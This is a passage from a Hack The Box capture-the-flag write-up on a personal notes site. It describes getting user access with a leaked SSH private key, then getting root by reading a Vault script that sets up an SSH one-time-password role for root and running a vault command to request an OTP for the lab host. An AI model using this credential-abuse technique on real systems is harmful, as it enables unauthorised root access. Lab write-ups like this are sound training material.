+<img src=https://i.imgur.com/Zwo1dtQ.png width=auto alt></p><blockquote><p><strong>Note</strong>: Don&rsquo;t overcomplicate things, work with what you have and exhaust every possibility before moving on</p></blockquote><p>I&rsquo;ve instantly looked at the <code>.ssh</code> folder and found the private key and therefore got user.</p><a href=#getting-root><h2 id=getting-root><span class=hanchor arialabel=Anchor># </span>Getting root</h2></a><p>Once I&rsquo;ve got user I immediatly went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.</p><p>After looking through almost everything, the <code>vault/secrets.sh</code> popped as the most interesting to have a look at:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># set up vault secrets backend</span>
+</span></span><span class=line><span class=cl>vault secrets <span class=nb>enable</span> ssh
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>vault write ssh/roles/root_otp <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=nv>key_type</span><span class=o>=</span>otp <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=nv>default_user</span><span class=o>=</span>root <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=nv>cidr_list</span><span class=o>=</span>0.0.0.0/0
+</span></span></code></pre></td></tr></table></div></div><p>With the help from Google I&rsquo;ve found
+<a href=https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html rel=noopener>this</a>. I&rsquo;ve just followed the article:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>vault write ssh/creds/otp_key_role <span class=nv>ip</span><span class=o>=</span>10.10.10.110
+</span></span></code></pre></td></tr></table></div></div><p>Got the otp and used it to connect through SSH, since root was allowed to login.</p><a href=#see-also><h2 id=see-also><span class=hanchor arialabel=Anchor># </span>See Also</h2></a><ul><li><a href=/write-ups/HTB rel=noopener class=internal-link data-src=/write-ups/HTB>write-ups/HTB</a></li></ul></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://hakbrain.xyz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Vl@gh3 using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2022</p><ul><li><a href=https://hakbrain.xyz/>Home</a></li><li><a href=https://twitter.com/vlaghe1>Twitter</a></li><li><a href=https://github.com/vlagh3>Github</a></li></ul></footer></div></div></body></html>
